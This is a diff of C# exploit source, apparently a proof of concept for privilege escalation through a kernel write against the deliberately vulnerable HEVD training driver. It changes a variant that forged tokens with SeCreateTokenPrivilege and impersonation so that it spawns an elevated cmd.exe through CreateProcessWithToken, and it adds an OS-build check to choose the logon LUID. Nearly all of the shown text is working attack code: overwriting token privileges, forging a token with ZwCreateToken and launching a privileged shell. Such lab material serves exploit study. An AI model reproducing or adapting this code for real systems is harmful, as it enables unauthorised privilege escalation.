@@ -5,9 +5,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Security.Principal;
 
-namespace CreateImpersonateTokenVariant
+namespace SecondaryLogonVariant
 {
-    class CreateImpersonateTokenVariant
+    class SecondaryLogonVariant
     {
         // Windows Definition
         // Windows Enum
@@ -20,6 +20,12 @@ namespace CreateImpersonateTokenVariant
             FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
             FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
             FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
+        }
+
+        enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
         }
 
         [Flags]
@@ -669,14 +675,12 @@ namespace CreateImpersonateTokenVariant
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);
 
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern bool CreateProcessAsUser(
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool CreateProcessWithToken(
             IntPtr hToken,
+            LogonFlags dwLogonFlags,
             string lpApplicationName,
             string lpCommandLine,
-            IntPtr lpProcessAttributes,
-            IntPtr lpThreadAttributes,
-            bool bInheritHandles,
             ProcessCreationFlags dwCreationFlags,
             IntPtr lpEnvironment,
             string lpCurrentDirectory,
@@ -765,6 +769,12 @@ namespace CreateImpersonateTokenVariant
             ref int ReturnLength);
 
         [DllImport("ntdll.dll")]
+        static extern void RtlGetNtVersionNumbers(
+            ref int MajorVersion,
+            ref int MinorVersion,
+            ref int BuildNumber);
+
+        [DllImport("ntdll.dll")]
         static extern int ZwCreateToken(
             out IntPtr TokenHandle,
             TokenAccessFlags DesiredAccess,
@@ -831,6 +841,7 @@ namespace CreateImpersonateTokenVariant
         const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
         const string SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege";
         const byte SECURITY_STATIC_TRACKING = 0;
+        static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
         // User define Consts
@@ -881,7 +892,7 @@ namespace CreateImpersonateTokenVariant
             SECURITY_IMPERSONATION_LEVEL impersonationLevel)
         {
             int error;
-            LUID authId = SYSTEM_LUID;
+            LUID authId;
             var tokenSource = new TOKEN_SOURCE("*SYSTEM*");
             tokenSource.SourceIdentifier.HighPart = 0;
             tokenSource.SourceIdentifier.LowPart = 0;
@@ -923,8 +934,27 @@ namespace CreateImpersonateTokenVariant
                 SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
             };
 
+            int majorVersion = 0;
+            int minorVersion = 0;
+            int buildNumber = 0;
+
+            RtlGetNtVersionNumbers(ref majorVersion, ref minorVersion, ref buildNumber);
+            buildNumber &= 0xFFFF;
+
+            if (tokenType == TOKEN_TYPE.TokenImpersonation &&
+                majorVersion >= 10 &&
+                minorVersion >= 0 &&
+                buildNumber >= 17763)
+            {
+                authId = ANONYMOUS_LOGON_LUID;
+            }
+            else
+            {
+                authId = SYSTEM_LUID;
+            }
+
             Console.WriteLine("[>] Trying to create an elevated {0} token.",
-                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
+            tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");
 
             if (!ConvertStringSidToSid(
                 DOMAIN_ALIAS_RID_ADMINS,
@@ -1100,7 +1130,7 @@ namespace CreateImpersonateTokenVariant
         }
 
 
-        static bool CreateTokenAssignedProcess(
+        static bool CreateSecondaryLogonProcess(
             IntPtr hToken,
             string command)
         {
@@ -1109,15 +1139,13 @@ namespace CreateImpersonateTokenVariant
             startupInfo.cb = Marshal.SizeOf(startupInfo);
             startupInfo.lpDesktop = "Winsta0\\Default";
 
-            Console.WriteLine("[>] Trying to create a token assigned process.\n");
+            Console.WriteLine("[>] Trying to create a secondary logon process.\n");
 
-            if (!CreateProcessAsUser(
+            if (!CreateProcessWithToken(
                 hToken,
+                LogonFlags.WithProfile,
                 null,
                 command,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                false,
                 0,
                 IntPtr.Zero,
                 Environment.CurrentDirectory,
@@ -1362,46 +1390,6 @@ namespace CreateImpersonateTokenVariant
         }
 
 
-        static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
-        {
-            int error;
-
-            Console.WriteLine("[>] Trying to impersonate thread token.");
-            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());
-
-            if (!ImpersonateLoggedOnUser(hImpersonationToken))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to impersonation.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return false;
-            }
-
-            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
-            IntPtr pImpersonationLevel = GetInformationFromToken(
-                hCurrentToken,
-                TOKEN_INFORMATION_CLASS.TokenImpersonationLevel);
-            var impersonationLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(
-                pImpersonationLevel);
-            LocalFree(pImpersonationLevel);
-
-            if (impersonationLevel == SECURITY_IMPERSONATION_LEVEL.SecurityIdentification)
-            {
-                Console.WriteLine("[-] Failed to impersonation.");
-                Console.WriteLine("    |-> May not have {0}.\n", SE_IMPERSONATE_NAME);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Impersonation is successful.");
-
-                return true;
-            }
-        }
-
-
         static void OverwriteTokenPrivileges(
             IntPtr hDevice,
             IntPtr tokenPointer,
@@ -1446,9 +1434,10 @@ namespace CreateImpersonateTokenVariant
             Marshal.Copy(nullBytes, 0, buffer, size);
         }
 
+
         static void Main()
         {
-            Console.WriteLine("--[ HEVD Kernel Write PoC : SeCreateTokenPrivilege And SeImpersonatePrivilege\n");
+            Console.WriteLine("--[ HEVD Kernel Write PoC : Secondary Logon\n");
 
             if (!Environment.Is64BitOperatingSystem)
             {
@@ -1488,34 +1477,18 @@ namespace CreateImpersonateTokenVariant
             OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
             CloseHandle(hDevice);
 
-            IntPtr hElevatedImpersonation = CreateElevatedToken(
-                TOKEN_TYPE.TokenImpersonation,
-                SECURITY_IMPERSONATION_LEVEL.SecurityDelegation);
-
-            if (hElevatedImpersonation == IntPtr.Zero)
-                return;
-
-            if (!ImpersonateThreadToken(hElevatedImpersonation))
-            {
-                CloseHandle(hElevatedImpersonation);
-
-                return;
-            }
-
-            CloseHandle(hElevatedImpersonation);
-
-            IntPtr hElevatedPrimary = CreateElevatedToken(
+            IntPtr hPrimaryToken = CreateElevatedToken(
                 TOKEN_TYPE.TokenPrimary,
                 SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous);
 
-            if (hElevatedPrimary == IntPtr.Zero)
+            if (hPrimaryToken == IntPtr.Zero)
                 return;
 
-            CreateTokenAssignedProcess(
-                hElevatedPrimary,
+            CreateSecondaryLogonProcess(
+                hPrimaryToken,
                 "C:\\Windows\\System32\\cmd.exe");
 
-            CloseHandle(hElevatedPrimary);
+            CloseHandle(hPrimaryToken);
         }
     }
 }
